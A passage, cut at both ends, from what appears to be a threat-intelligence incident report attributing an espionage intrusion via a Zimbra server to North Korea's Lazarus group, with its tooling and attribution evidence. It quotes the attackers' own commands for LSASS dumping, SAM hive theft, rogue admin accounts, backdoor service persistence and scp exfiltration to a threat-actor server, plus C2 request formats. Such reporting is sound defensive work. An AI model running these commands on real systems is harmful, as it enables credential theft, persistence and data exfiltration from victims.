Shell\n\nPERSISTENCE **T1037.005 Boot or Logon**\nInitialization Scripts Startup Items\n\nPERSISTENCE **T1053.005 Scheduled**\nTask/Job: Scheduled Task\n\nDEFENSE **T1036.005 Masquerading**\nEVASION – Match Legitimate Name\nor Location\n\nDEFENSE **T1553 Subvert Trust**\nEVASION Controls – Code Signing\n\nDEFENSE **T1070.004 Indicator**\nEVASION Removal – File Deletion\n\nDEFENSE **T1070.007 Indicator**\nEVASION Removal – Clear Network\nConnection History and\nConfigurations\n\n\nMultiple Web Shells utilized. These have been listed and described in this report\n\nCreate a service which will run acres.exe sc create RegistryCheck\nautomatically at startup type= own type= interact\nstart= auto error= ignore\nbinpath= \"cmd /K start c:\\\nwindows\\temp\\acres.exe\"\n\n\nSuspicious scheduled task creation: \"TaskName\": \\\\\nclNRNthQ - Several scheduled tasks were created\non a server. The task names were all a similar\nformat of 8 random alpha, as seen in the names of\nthe temporary files. This may indicate that these\nscheduled tasks were created programmatically by\nthe threat actor’s tools\n\nListed files on the Zimbra server were named to\nmatch a pre-existing, legitimate directory within the\nsame parent directory\n\nSeveral binaries deployed by the threat actor were\nsigned with a “LAMERA CORPORATION LIMITED”\ncode signing certificate\n\n\n\n\n\nDeletion of temporary files cmd.exe /C net use \\[Internal\nIP]\\d$ /delete > C:\\Windows\\\nTemp\\[a-zA-Z]{8}.tmp 2>&1\n\nDeletion of temporary files cmd.exe /C del /f /q /a c:\\\nwindows\\temp\\*.tmp > C:\\\nWindows\\Temp\\[a-zA-Z]{8}.\ntmp 2>&1\n\n\n\"Microsoft-Windows-TerminalServicesRemoteConnectionManager/Admin\" cleared by\n\"support\" account - deletion of RDP logs\n\n\n\n\nPERSISTENCE **T1136 Create Account** Created accounts detailed in report \n\n-----\n\n**Document name | Security level**\n\n**Tactic** **Technique** **Description** **Activity**\n\n\nPERSISTENCE\n/ PRIVILEGE\nESCALATION\n\nPRIVILEGE\nESCALATION\n\n\n**T1078 Valid Accounts** Create support account net user support /add\n\nAdd support user to Remote Desktop Users group cmd.exe /C net localgroup\non local device Remote Desktop Users\"\nsupport /add > C:\\\nWindows\\Temp\\[a-zA-Z]\n{8}.tmp 2>&1\"\n\nAdd support group to Domain Admins active cmd.exe /C net localgroup\ndirectory domain group Domain admins\" support /\nadd > C:\\Windows\\Temp\\\n\n[a-zA-Z]{8}.tmp 2>&1\"\n\nAdd support account to Administrators group on net localgroup\nlocal device Administrators support /add\n\nActivate guest account net user guest /active:yes\n\nAdd guest account to Administrators group on spoolsv.exe -> net\nlocal device localgroup administrators\nGuest /add\n\n\nCREDENTIAL **T1003.001 LSASS**\nACCESS Memory\n\nCREDENTIAL **T1556 Modify**\nACCESS Authentication Process\n\n\n[Exploitation of CVE-2021-4034](https://blog.qualys.com/vulnerabilities-threat-research/2022/01/25/pwnkit-local-privilege-escalation-vulnerability-discovered-in-polkits-pkexec-cve-2021-4034) in ‘pkexec’ known\nas pwnkit, to perform local privilege escalation to\nroot 40\n\nExploitation of ‘Printnightmare’ vulnerability (CVE2021-34527) to execute ord.dll with SYSTEM\nprivileges\n\nUse of DumpLsass hacking tool to create a dump\nof hashes which can then be moved elsewhere for\nhashes to be extracted using Mimikatz\n\n/opt/zimbra/jetty_base/webapps/zimbra/public/\nlogin.jsp File modified to log credentials to text file\nat /opt/zimbra/jetty_base/webapps/zimbra/public/\ntemp/zlog.txt\n\n\n\ncmd.exe /C c:\\windows\\\nsystem32\\rundll32.exe\nC:\\windows\\System32\\\ncomsvcs.dll, MiniDump\n680\n\nC:\\windows\\temp\\mmc.\ndat full > C:\\Windows\\\nTemp\\[a-zA-Z]{8}.tmp\n2>&1\n\n\n\nConfigure device to store credentials in memory, regkeyvalue:_HKLM\\\nmaking it pos-sible to extract hashes with Mimikatz SYSTEM\\\nControlSet001\\ Con-trol\\\nSecurityProviders\\\nWDigest\\\\\nUseLogonCredential\n\n\nDISCOVERY **T1012 Query Registry** Save a copy of the SAM registry hive. The threat\nactor saved the Security and System hives in the\nsame way\n\n\ncmd.exe /C reg.exe save\nhklm\\sam c:\\windows\\\ntemp\\sam.save > C:\\\nWindows\\Temp\\[a-zA-Z]\n{8}.tmp 2>&\n\n\n-----\n\n**Document name | Security level**\n\n**Tactic** **Technique** **Description** **Activity**\n\n\nDISCOVERY **T1016** System Network\nConfiguration Discovery\n\nDISCOVERY **T1018 Remote System**\nDiscovery\n\nDISCOVERY **T1033 System Owner/**\nUser Discovery\n\nDISCOVERY **T1049 System Net-work**\nConnections Discovery\n\n\nQuerying the network configuration of the local cmd.exe /C ipconfig /all > C:\\\ndevice Windows\\Temp\\[a-zA-Z]{8}\n\nQuery default name server for supplied host/ cmd.exe /C nslookup\ndomain name [hostname.fqdn] > C:\\\nWINDOWS\\Temp\\[a-zA-Z]\n{8}.tmp 2>&1\n\nList computer accounts in Active Directory, returning cmd.exe /C powershell\nIP address, OS, and OS Service Pack level Get-ADComputer -Filter *\n-Properties ipv4Address,\nOperatingSystem, OperatingSystemServicePack > C:\\\nWindows\\Temp\\[a-zA-Z]{8}.\ntmp 2>&1\n\n\nShow current TCP connections on the local device cmd.exe /C netstat -naop tcp\n\n                         - C:\\Windows\\Temp\\[a-zA-Z]\n{8}.tmp 2>&1\n\n\nExport events from the RDP event log, specifically\nevent ID 1149, which will show which users have\nconnected to the local device via RDP\n\n\ncmd.exe /C wevtutil epl\nMicrosoft-WindowsTerminalServicesRemoteConnectionManager/\nOperational C:\\windows\\\ntemp\\rdl.evtx\n\n\nSend a single ICMP ping to another device on the cmd.exe /C ping -n 1 [Internal\nnetwork IP]> C:\\Windows\\Temp\\\n\n[a-zA-Z]{8}.tmp 2>&1\n\n\nReturn information about active sessions on the\nlocal device. The threat actor also used query user,\nwhich returns information about the active users in\nthose sessions\n\n\ncmd.exe /C query session >\nC:\\Windows\\Temp\\[a-zA-Z]\n{8}.tmp 2>&1\n\n\nDISCOVERY **T1057 Process Discovery** Return information about the LSASS process cmd.exe /C powershell.exe\nGet-Process Lsass > C:\\\nWindows\\Temp\\[a-zA-Z]{8}.\ntmp 2>&1\n\nView currently running processes with ‘tasklist’ cmd.exe /C tasklist > C:\\\ncommand Windows\\Temp\\[a-zA-Z]{8}.\ntmp 2>&1\n\n\nDISCOVERY **T1082** System\nIn-formation Discovery\n\nDISCOVERY **T1083 File and Directory**\nDiscovery\n\nDISCOVERY **T1087.002 Account**\nDiscovery - Domain\nAccount\n\n\nQuerying members of the Domain Admins group\nwith the built in Windows net command. As well as\nnet group, the threat actor used net user and net\nshare to gather information\n\n\nReturns detailed information about the local device cmd.exe /C systeminfo > C:\\\nhardware and OS Windows\\Temp\\[a-zA-Z]{8}.\ntmp 2>&1\n\n\nDirectory listing of a directory on the D$ drive share\non the local device, though using the device IP\naddress for some reason\n\n\ncmd.exe /C reg.exe save\nhklm\\sam c:\\windows\\temp\\\nsam.save > C:\\Windows\\\nTemp\\[a-zA-Z]{8}.tmp 2>&\n\n\nDisplay the folder structure of the d: drive and pipe cmd.exe /C cd d:\\ & tree d: >\noutput to the temp folder C:\\Windows\\Temp\\[a-zA-Z]\n{8}.tmp 2>&1\n\n\ncmd.exe /C net group /\ndomain Domain Admins\" >\nC:\\Windows\\Temp\\[a-zA-Z]\n{8}.tmp 2>&1\"\n\n\n-----\n\n**Document name | Security level**\n\n**Tactic** **Technique** **Description** **Activity**\n\n\nLATERAL **T1021.001 Remote**\nMOVEMENT Services – Remote\nDesktop Protocol\n\nLATERAL **T1021.001 Remote**\nMOVEMENT Services – Server\nMessage Block\n\nCOMMAND AND **T1071.001** Application\nCONTROL Layer Protocols – Web\nProtocols\n\n\nRDP – use of valid accounts to move laterally in the network over RDP\n\nSMB - use of valid accounts to move laterally in the network over SMB\n\ncarbon.jsp - Initial webshell installed immediately following compromise\n\nbase.jsp - Second webshell installed by actors \nskin.dat - Webshell on Zimbra server, used for initial\nexfiltration of data\n\n\nCOLLECTION **T1114.002** Used pre-existing mailbox backup script on Zimbra\nmail server to copy all emails to a single file, then\nexfiltrated the file\n\nCOLLECTION **T1560** Creation of skin.dat data dump archive and\nfunctionality of DTrack info stealer, which adds data\nto a password protected archive file then moves the\nfile to a hardcoded internal staging point\n\nCOLLECTION **T1074** Data staged locally on devices in archive files, in\nsome cases those archives were then moved to an\ninternal staging point.\n\nCOLLECTION **T1119** DTrack automatically gathers data on the local\nsystem using legitimate windows commands such\nas systeminfo, netstat and tasklist.\n\n\n\n\n\ncmd.exe /c systeminfo >\n%TEMP%\\temp\\info.res &\ntasklist > %TEMP%\\temp\\\ntask.res & netstat -naop tcp >\n%TEMP%\\temp\\netstat.res\n\n\nCOMMAND AND **S0154** Software – Cobalt\nCONTROL Strike\n\nCOMMAND AND **T1071 Application Layer**\nCONTROL Protocol\n\nCOMMAND AND **T1090.002 Proxy -**\nCONTROL External Proxy\n\nCOMMAND AND **T1090.001 Proxy –**\nCONTROL Internal Proxy\n\nEXFILIRATION **T1041** Exfiltration Over\nC2 Channel\n\nTable 14: TTP Summary\n\n\nCommunication with two known Cobalt Strike hosts observed\n\nSecure Shell protocol used \n\nC2 behavior suggests a small number of C2 servers\nconnecting via multiple relays/endpoints. Some\nC2 servers appear to themselves be compromised\nvictims\n\n\n\n\nPlink (Putty link) and 3Proxy were used together to create a proxy on the victim environment\n\n\nUse Putty SCP to make an SSH connection to\nthreat actor server 104.225.129[.]103, authenticate\nwith the username [redacted]. The password has\nbeen redacted\n\n\ncmd.exe /C echo y | c:\\\nwindows\\temp\\pscp.exe -scp\n-P 22 -pw [REDACTED] \\\n\n[Internal IP]\\d$\\[directory]\\\n\n[filename] [REDACTED]\n@104.225.129[.]103:/home/\n\n[redacted]/ > C:\n\\Windows\\Temp\\[a-zA-Z]{8}.\ntmp 2>&1\n\n\n-----\n\n**Document name | Security level**\n\n\n### 5. Threat Actor Tooling\n\n\nThroughout the attack, the threat actor used a plethora\nof tools. A common technique was the use of the\nWindows temp directory for staging executables.\nDuring the initial access phase, WithSecure™ believes\nat least two publicly available remote access tools\n[(webshell JspSpy and file browser JspFileBrowser)](https://github.com/tennc/webshell/blob/master/jsp/JspSpy.jsp)\nwere installed and used to establish and maintain\naccess after exploitation of a vulnerable public facing\nserver. These tools continued to be accessed by the\nthreat actor even after malware and tunnelling tools\nwere installed within the network. The threat actor may\nhave been verifying that the tools were still accessible\nas they were intended as a persistence method, or\nthey may have been using them instead of other tools\nto reduce the indicators of compromise left across\nthe network. It is highly likely that the threat actor also\n[uses publicly available PHP webshells such as “WSO](https://github.com/mIcHyAmRaNe/wso-webshell/blob/master/wso.php)\n[webshell” to maintain access to compromised servers](https://github.com/mIcHyAmRaNe/wso-webshell/blob/master/wso.php)\nwhich they have configured to use as proxies for\nattacks against their subsequent targets, much as they\ninstalled webshells and ‘Stunnel’ on the Internet facing\nZimbra server of this victim.\n\n##### Grease\n\n\nMultiple small binaries were used in the attack, each\nof which has a narrow, dedicated capability designed\nto automate several operations in different phases of\nthe attack. These included binaries for establishing\npersistence, local escalation of privileges, local host\ndiscovery and reconnaissance. Many of the tools rely\non the Windows WinExec api to execute commands\nwith the help of Windows built in binaries. In some of\nthe actor’s binaries the executed commands are hardcoded, but in others the operator is given an interactive\nshell for manual execution of commands.\n\nThe overall toolkit of the threat actor is very similar to\nother reported instances of North Korean groups. The\nusage of Dtrack and Grease malware has been previously associated with Kimsuky, while Dtrack is also\nin the Lazarus arsenal. The toolkit aligns with other\nreporting of this campaign from Talos Intelligence\nand Symantec.\n\nUnfortunately, WithSecure™ has not been able to\nstudy all the binaries used by the threat actor as the\nthreat actor almost certainly took action to obstruct\nany investigation, including the deletion of tools and\nany staged data.\n\n\n**Binary** **Hash**\n\nord.dll 7c40d4ded95f425fa01895f9d4359c9ef250290a\n\n\nThe threat actor used a dedicated tool to create a\nprivileged user account on the victim hosts and enable\nRDP. This tool resembles an older piece of malware\ndubbed “GREASE”. It dropped files ‘RDPConf.exe’\nand ‘RDPWInst.exe’ under the %TEMP% directory.\nThese are binaries from the Open-Source project\nRDPWrap. RDPWInst.exe is the installer for RDPWrap\n\n\nwhich is executed via a Windows WinExec API call\nand “-i” command line argument. RDPConf.exe is a\n[configuration tool for RDPWrap. After installation of](https://github.com/stascorp/rdpwrap)\nRDPWrap the tool will attempt to set a password for\nthe Guest user account, activate the account and add\nit to the local Administrators group with WinExec\nAPI calls:\n\n\n-----\n\n**Command executed**\n\n“net user Guest 1qaz123!@#”\n\n“net user Guest /active:yes”\n\n“net localgroup administrators /add”\n\nTable 15: Net commands executed by the new GREASE variant\n\nThese actions as well as the installation of the\nRDPWrapper require elevated privileges and\nWithSecure™ has observed the threat actor using the\n‘PrintNightmare’ vulnerability to execute ord.dll to gain\nrequired privileges. In these attacks, ord.dll is staged\n[in another domain host. PrintNightmare is a local](https://infosecwriteups.com/exploiting-printnightmare-cve-2021-34527-10c6e0f5b83f)\nprivilege escalation and remote code execution vulnerability. It allows for a threat actor to load their own .dll\nfiles such as ‘ord.dll’ with SYSTEM privileges.\n\nSince at least 2018, Kimsuky group has been using\nmalware dubbed “GREASE”. This malware was built\nto enable RDP access on the host via the Windows\nregistry and to create a new administrator account for\nRDP access. While the approach of ‘ord.dll’ is slightly\ndifferent, it is notable how similar the two tools are.\n\nIn older versions of GREASE malware, remote access is\nestablished with the help of group policy, opening the firewall, making changes to the registry, and creating a local\nprivileged user account. The ord.dll sample from this\nincident achieves the same result by using RDPWrap\nand installing it onto the host as an RDP service.\n\n\n**Document name | Security level**\n\nThe privileged user account is created with net user\ncommands similar to those contained in GREASE\nmalware. While there are differences in the binaries\nin terms of methods to achieve the end result, the\nflow of the programs is similar. The older GREASE\nsample structures functions per activity (function for\nGPO modifications, function for registry, function for\nadding the user account) within DLLMain, but ord.dll\nbundles the installation of RDPWrap and configuring\nthe privileged user account into a single function under\nDLLMain.\n\n‘ord.dll’ requires the DLLMain fdwReason parameter\nto be set to DLL_PROCESS_ATTACH while the\ncompared GREASE sample does not.\n\nAn additional similarity in the binaries is the similar\nhardcoded password within ‘ord.dll’, as previously\nseen in older GREASE samples, and both binaries use\nWinExec api to execute net commands.\n\n\n**Ord.dll** **Grease**\n\n1qaz123!@# 1qaz2wsx#EDC\n\nNote that both passwords are patterns made on a US keyboard\nalmost certainly with the left hand.\n\n##### SPutty link, 3Proxy & Stunnel\n\n**Binary** **Hash**\n\nPlink – phost.exe 9d97c6920385c20cd1023fb9f094bf35e0efbadf33576d457834e\n51c2ef1270\n\n3Proxy – shost.exe 2963a90eb9e499258a67d8231a3124021b42e6c70dacd3aab36\n\n746e51e3ce37e\n\n\n-----\n\nThe threat actor used Plink (Putty link) and 3Proxy\ntogether to create a proxy on the victim environment.\nThe copy of 3Proxy observed was the same sample\n(matched by hash) as a sample previously detailed by\nTalos Intelligence attributed to Lazarus activity.\n[The blog from Talos Intelligence also describes how](https://blog.talosintelligence.com/lazarus-three-rats/)\nthe files are used in tandem to create a proxy:\n\n#### “These two tools working together create\na proxy on the victim system which\nhas its listening port \"exported\" to a\nport on a remote host. This mechanism\nallows the attacker to have a local proxy\nport that gives access to the victim\nnetwork as if the attacker's box was on it\ndirectly.”\n\n##### Dtrack\n\n\n**Document name | Security level**\n\n‘Stunnel’ (an open-source proxy tool) was also used\nearlier in the attack on patient zero. After gaining\ninitial access and escalating privileges locally, the\nadversary installed ‘Stunnel’ via yum on the server and\npointed it towards the threat actor-controlled server\n104.225.129[.]103:443.\n\n\n**Binary** **Hash**\n\nonedriver.exe 47f12a1976552a1319bd58d813f213d7ebdef4fa\n\n**Binary Characteristic** **Value**\n\nlanguage English-United States\n\ncode-page Unicode UTF-16, little endian\n\nCompanyName Microsoft Corporation\n\nFileDescription Windows Update Standalone Installer\n\nFileVersion 10.0.19041.1 (WinBuild.160101.0800)\n\nInternalName wusa.exe\n\nLegalCopyright © Microsoft Corporation. All rights reserved.\n\nOriginalFilename wusa.exe.mui\n\nProductName Microsoft® Windows® Operating System\n\nProductVersion 10.0.19041.1\n\n\nOne of the malware binaries recovered from the environment was a variant of a malware known as ‘Dtrack’.\nDtrack is an information stealing malware attributed to\nNorth Korea and used in multiple incidents attributed\nboth to Lazarus as well as Kimsuky group.\n\n\nOnedriver.exe is a dropper for a Dtrack. This dropper\n[works similarly to other previously described Dtrack](https://securelist.com/dtrack-targeting-europe-latin-america/107798/)\ndroppers where the payload decryption takes place\nbetween the start() and winmain() functions within a\nbenign binary. Interestingly the dropper file has been\nsigned, and this same signing certificate has been\nused by the threat actor to sign various other files in\nthe attack:\n\n\n-----\n\n**Document name | Security level**\n\n**Certificate Characteristic** **Value**\n\nMD5 B3B9D4A2CAC8EA76F570BBDE5249F076\n\nSHA1 6D0BFFE68BC8992B60DC294EC68DD2B44A5FC6F4\n\nSHA256 CD27DAA4BED5C1CFD02B43C1322829DC5396D545F3912B9\n\n694FC5A2499D5089E\n\nValid-from 11/02/2022 – 04:44:55\n\nValid-to 31/12/2039 – 23:59:59\n\nKeyID 9784a36611c68337698d3be972bd5dca\n\nCertificate Issuer CN=LAMERA CORPORATION LIMITED\n\nCertificate SerialNumber 879fa942f9f097b74fd6f7dabcf1745a\n\n\nThe Dtrack variant recovered is very similar to the\n[one used at the end of 2019 in a cyberattack against](https://arstechnica.com/information-technology/2019/10/indian-nuclear-power-company-confirms-north-korean-malware-attack/#p3)\n[an Indian nuclear powerplant. The Dtrack binary in](https://arstechnica.com/information-technology/2019/10/indian-nuclear-power-company-confirms-north-korean-malware-attack/#p3)\nthis case is a variant without its own C2 server, which\ninstead expects another backdoor or tool to exfiltrate\nthe data from the victim environment.\n\nThe information stealer will collect data from the host\nwith the help of WinExec and legitimate Windows\ncommand line tools:\n\n\nIn the Dtrack variant used by the actor, a typo was\nincluded in the path of one WinExec call. The malware\ntries to execute the command:\n\n\ncmd.exe /c ping -n 3 127.0.0.1 >NUL & echo EEEE\n\n- c:\\windows emp\\stt.exe\n\n\ncmd.exe /c systeminfo > %TEMP%\\temp\\info.res\n& tasklist > %TEMP%\\temp\\task.res & netstat\n-naop tcp > %TEMP%\\temp\\netstat.res\n\n\nIt will also create a list of available disks in a file in a\nnew directory under C:\\Windows\\Temp, named from\nthe host IP address.\n\nAll the data is then packed into a password protected\narchive with “windows” as the password. The archive\nis then exfiltrated to another host in the victim network\nby mounting the target as a file share and copying\nthe data over by using net commands via WinExec.\nThe internal IP address of the target staging host\nis hardcoded into the Dtrack malware. The staging\nand exfiltration host was likely carefully chosen by\nthe threat actor to be a host where endpoint security\nmonitoring tools were not deployed.\n\n\nThis malware was written in C++, where the developer\nhas to escape backslashes in the directory path\nwhen including it in the source code for the WinExec\ncall. The escape character for the backslash before\n“temp” was missing and so instead it applies to the\n“t” of “temp” and is interpreted as a “\\t” tab character\ninstead of “\\” backslash. This caused the output to fail\nas Windows does not allow tabs in directory names.\n\nThe reason for this command is unclear. The ping and\necho to a file is perhaps used for signaling that the\ninformation stealing process is complete.\n\nDtrack has previously been used in attacks against the\nenergy sector, as well as financially motivated attacks\nwith Maui ransomware. It has been deployed in incidents\nattributed to both Kimsuky and Lazarus. We observed\nstriking similarity to the Dtrack variant which was seen\nin the compromise of the Indian nuclear powerplant in\n2019 which had been attributed to Lazarus group. The\npresence of Dtrack in the environment is a strong indication of a North Korean threat actor.\n\n\n-----\n\n**Document name | Security level**\n\n##### Bind Shell\n\n**Binary** **Hash**\n\nmfcbi.dll 407b934895741a1d3b197e4e3c3d2e3284ebc76a\n\n\nOne of the very simple tools used by the threat actor\nwas a 64bit DLL bind shell. When this file is executed,\nit creates a listener on localhost on port 1357 and upon\na successful incoming connection it starts cmd.exe\nand passes it to the connecting party. Similarly to ord.\ndll this was also executed with the help of PrintNightmare to essentially leave an elevated backdoor to a\nhost, accessible from the internal network.\n\n##### Acres.exe\n\n\nUsed together with 3Proxy and Plink, this backdoor\nwould be accessible from the threat actors’ network.\n\n\n**Binary** **Hash**\n\nacres.exe 46a934e7b42bfb0a2a9bcecade78f63375192924\n\n\nThis is a 64bit C++ backdoor/remote access tool. It\nwas compiled in July 2022 with MinGW(7.3.0).\n\nSimilarly to MagicRAT it has been written with the\nhelp of QT library and it uses QT functions extensively\nthroughout the code. There are many differences to\npreviously known samples of MagicRAT, but this may\nbe another variant which has seen changes to the C2\ndetails as well as the removal of most of the\nhardcoded commands.\n\nThe threat actor establishes persistence on victim\nmachines with the help of this backdoor by scheduling\nit as a service. The Acres sample does not automatically set persistence for itself but requires another\ncomponent or separate command to do so.\n\n\nThe similarity of the service creation to the way\nVSingle malware establishes persistence for payloads\nshould be noted. VSingle service creation as reported\nby Talos Intelligence:\n\n\nThe Acres malware has a multithreaded approach\nand uses named pipes to communicate with launched\nchild processes. Execution of child processes and the\ncommunication is conducted via the QT library.\n\nQT named pipes:\n\n\nsc create \"%s\" DisplayName= \"%s\" type=\nown type= interact start= auto error= ignore\nbinpath= \"cmd.exe /k start \\\"\\\" \\\"%s\\\"\n\n\nsc create RegistryCheck type= own type=\ninteract start= auto error= ignore  binpath=\n\"cmd /K start c:\\windows\\temp\\acres.exe\"\n\n\n\\\\.\\pipe\\qt-%IX-%X\n\n\n-----\n\nContrary to the MagicRAT, the command and control\ndetails are hardcoded, xor encrypted with a single byte\nkey: 0x78 and base64 encoded. When the backdoor\nstarts, the C2 details and other parameters are read from\nmemory, and it calls home. The following GET request\nparameters are formatted from the host details where\nthe “param” contains the internal IP address of the host\n\n\nGET /resource/main/rawmail.php?mailid={victim_identifier}&action=inbox&param=SUFKVklOQFZIVklD&session={c2_call_id}\nHTTP/1.1\n\nHost: 15.207.207[.]64\nUser-Agent: Mozilla/5.0 (Windows NT 10.0;\nWin64; x64; rv:100.0) Gecko/20100101\nFirefox/100.0\nConnection: Keep-Alive\nAccept-Encoding: gzip, deflate\nAccept-Language: en-US,*\n\n\nThis “action=inbox” call is then registered and stored\nat the C2 server in base64 encoded string which\ndecodes to a format:\n\n\n{identifier};{internal_ip_address};{public_ip_\nof_victim};{timestamp}\n\n\nThe malware expects the body of the response to\ncontain a command to execute. This response is also\nxor encrypted with the same key and base64 encoded.\nIf no known commands are present, the c2 response\nwill be executed by passing it as an argument to a new\ncmd.exe. The command output is then sent to the C2\nserver in a similar request with different c2_call_id:\n\n\n**Document name | Security level**\n\nIn addition to arbitrary command execution, the\nmalware can fetch files from new URLs, write them\ndisk and execute them with cmd.exe.\n\nFrom malware analysis, WithSecure™ Threat\nIntelligence team discovered that when Acres.exe is\nuploading data to the command and control server\nand the data exceeds 1024 bytes, it will truncate and\nappend “< No Pineapple! >” to the end of the 1024\nbyte message before sending it to the C2.\n\n##### Impacket\n\nThe threat actor used the ‘atexec’ module of Impacket\nto proxy command execution on hosts. This is visible\nin the cmd.exe command executions where the output\nis diverted to a randomly named file in Windows’\ntemp directory.\n\n##### Mimikatz\n\nIn the incident WithSecure™ observed the use of\nMimikatz. The Mimikatz binary was detected on\nseveral devices with different filenames such as\n“Plock.exe”.\n\n##### Web Shells\n\nThe Zimbra server was the initial access vector and\nis very likely to have been compromised by exploiting\nvulnerabilities CVE-2022-27925 and CVE-202237042, which together allow for remote command\nexecution without any need to authenticate.\n\nMultiple webshells were found on the Zimbra server,\nand while two were dropped and used by the threat\nactor, several other webshells and artifacts pre-date\nthis particular compromise, indicating that the server\nwas most likely compromised multiple times by\ndifferent actors. The Zimbra vulnerabilities are known\nto have been targeted by widespread opportunistic\ninternet scanning, so multiple exploitations are not\nunexpected. Of the other identified webshells, some\nwere accessed by the threat actor, but characteristics\nof this activity make it likely that this was just reconnaissance of the local server.\n\n\nGET /resource/main/rawmail.php?mailid={victim_identifier}&action=sent&body={xor_base64_output_of_command}&param=\nSUFKVklOQFZIVklD&session={c2_call_id}\n\n\n-----\n\n###### base.jsp\n\nA webshell used by the threat actor for remote command\nexecution and file transfers, this file was in fact the\nJspSpy webshell. The filename base.jsp was most likely\nchosen to blend into the folder it was dropped in, which\ncontained a legitimate folder named ‘Base’.\n\n### 6. Attribution\n\nThe investigation was initially started with the assumption that the IR team was dealing with a ransomware\nthreat actor and BianLian in particular, due to a specific\ndetected C2 IP address. After the incident response\nteam was able to recover more artifacts, a strong link\ncould be established to a North Korean threat actor.\n\nFor reasons described below WithSecure™ Threat\nIntelligence assess with strong confidence that the\nthreat actor is the Lazarus group from the 3rd Bureau\nof North Korean People’s Army and that the goal of the\ncampaign is intelligence gathering, specifically technological/commercial espionage.\n\n- TTP overlap with Lazarus Group as detailed in\n[reports by Symantec and Talos](https://symantec-enterprise-blogs.security.com/blogs/threat-intelligence/stonefly-north-korea-espionage)\n\n- Tooling overlap in campaigns attributed to\nLazarus group:\n\n    - Use of known DPRK malware Dtrack\n\n     - Utilization of 3Proxy, Plink & Stunnel\n\n    - Similarities with MagicRAT and\n‘acres’ malware\n\n    - DPRK association to GREASE malware\n\n- Password usage similarity to previous\nDPRK incidents\n\n- Operational security fails exposing DPRK\nIP address\n\n- Targeting profiles conforming with prior DPRK\nattributed incidents\n\n- Time zone analysis\n\n\n###### carbon.jsp\n\nA JSPFileBrowser tool used by the threat actor. Once\nagain, the filename was most likely chosen to blend\ninto the containing folder, which contained a legitimate\nfolder named carbon.\n\n##### Overlaps in Threat Actor TTPs  and Malware\n\nMany of the observed TTPs and collected tools have\npreviously been attributed by other researchers to\nKimsuky or Lazarus groups. The fact that references to\nboth groups are observed could highlight the sharing\nof tooling and capabilities between North Korean\nthreat actors. In this incident WithSecure™ observed\nusage of a malware similar to GREASE, also previously attributed to Kimsuky. Another recovered malware\nwas a custom version of Dtrack, with a very similar\nconfiguration to one discovered in an attack against\nthe Indian Kudankulam Nuclear Power Plant at the end\nof 2019 – attributed to Lazarus. Also observed was the\nusage of Putty Plink together with 3Proxy, a common\ntechnique previously attributed to Lazarus. Links of\neach of the malware to the threat actor is covered in\nmore detail in the attack tools section.\n\n##### Time Zone Analysis\n\nTime zone attribution analysis concluded that the time\nzone aligns with UTC +9. Reviewing activity by time\nof day finds that most threat actor activity occurred\nbetween 00:00 to 15:00 UTC (09:00 and 21:00 UTC\n+9). Analysing activity by day of the week suggests\nthat the threat actor was active Monday to Saturday, a\ncommon work pattern for DPRK.\n\n\n-----\n\nFigure 1. threat activity\nby time of day (UTC+9)\n\nFigure 2. threat activity\nby weekday\n\n##### Operational Security Fail\n\nWhen investigating the network logs on the patient\nzero server to identify entities connecting to the\nwebshells, WithSecure™ realized that one of the\nconnections originated from a North Korean IP\naddress: 175.45.176[.]27 This connection was a\nsingle instance at the beginning of that current day. It\nwas both preceded on the previous days, as well as\nfollowed (with a delay) by connections coming from\na proxy address: 209.95.60[.]92. We suspect that\nthis instance was an operational security failure by\nthe threat actor at the start of their workday and after\na small delay they came back via the intended route.\nThis is significant as the only North Korean IP addresses are three /24 networks which are directly controlled\nand used by the North Korean government, and as\nsuch it is extremely likely that this activity was initiated\nby a North Korean state actor.\n\n\n**Document name | Security level**\n\nThe connection originating from North Korea towards\none of the webshells carried a user agent for Firefox\non Linux: “Mozilla/5.0 (X11; Linux x86_64; rv:91.0)\nGecko/20100101 Firefox/91.0”. It seems that this same\nuser-agent was sustained across the operation even if\nthere were multiple operators in the threat group.\n\n##### Infrastructure Overlap\n\nWe were not able to find overlaps in infrastructure\ncompared to the research published earlier this year.\nAnother notable detail is that there were no domain\nnames used by the threat actor, they seemingly have\nshifted their infrastructure to be solely IP based since\nthe earlier publications.\n\n\n-----\n\n##### Threat Actor Context\n\nNorth Korean threat actors have conducted financial,\nespionage and sabotage cyber-attacks for a long\ntime, Lazarus group has been active throughout 2022\nand attacked multiple high value targets from various\nprivate and public industry & research verticals. The\ntargeting of the victims and the overlap between\ntoolsets from Lazarus & Kimsuky also aligns with\n[Mandiant’s assessment of threat actor “Bureau 325”](https://www.mandiant.com/resources/blog/mapping-dprk-groups-to-government)\nor “CERIUM”. Bureau 325 is believed to be comprised\nof individuals from previously tracked clusters including TEMP.Hermit (Lazarus) and Kimsuky.\n\n###### DPRK Groups of Note\n\n- Kimsuky – Attributed in open source to the 5th\nBureau, Inter-Korean Affairs, as such it typically\nfocuses on South Korea related targets\n\n- APT38, Lazarus, Andariel – Attributed to 3rd\nBureau - Foreign Intelligence and Reconnaissance\nGeneral Bureau. These appear to be multiple intrusion sets with an international focus which overlap\nto varying degrees.\n\n- APT37 – Ministry of State Security, focuses on\nSouth Korea\n\n\n**Document name | Security level**\n\nDPRK Threat Actor targeting reflects the state’s\npriorities. As such South Korea is a particular focus,\nbut targeting of other nations is commonplace, as well\nas financial crime (both theft and ransomware) to fund\nthe state, and commercial/industrial espionage. These\nactors will also target defectors, journalists, human\nrights organizations, and other entities which may\ncriticize or focus upon the DPRK.\n\nWhile the organizations behind these threat actors\nhave different primary requirements, the sectors, and\nentities they target often overlap.\n\n###### BianLian relation\n\nThe Cobalt Strike activity initially detected by the\nWithSecure™ Intelligence proactive threat hunt was\nbeaconing to a server (104.225.129[.]86) which has\npreviously also been identified as associated with the\nthreat actor behind BianLian ransomware.\nWithSecure™ Threat Intelligence were unable to find\nany definitive connections between BianLian and\nDPRK and are unable to make any sort of assessment\nas to whether the intrusion sets are linked or not.\n\n\n-----\n\n### 7. Victimology\n\nWhile investigating this incident WithSecure™\nwere able to identify additional victims of this attack\ncampaign based on connections to one of the Threat\nActor controlled C2 servers and connections outwards\nfrom the victim network. One of the victims was in the\nhealthcare research vertical within India. In recent\nyears the Indian research and technology sector has\nbeen a common target of those North Korean threat\ngroups with a focus on intelligence collection.\n\nOther victims of this campaign identified by\nWithSecure™ included healthcare research, a manufacturer of technology used in energy, research, defense,\nand healthcare verticals, as well as the chemical engineering department of a leading research university.\n\n\n**Document name | Security level**\n\nThe victimology of previous campaigns attributed to\nLazarus is similar and contributes to 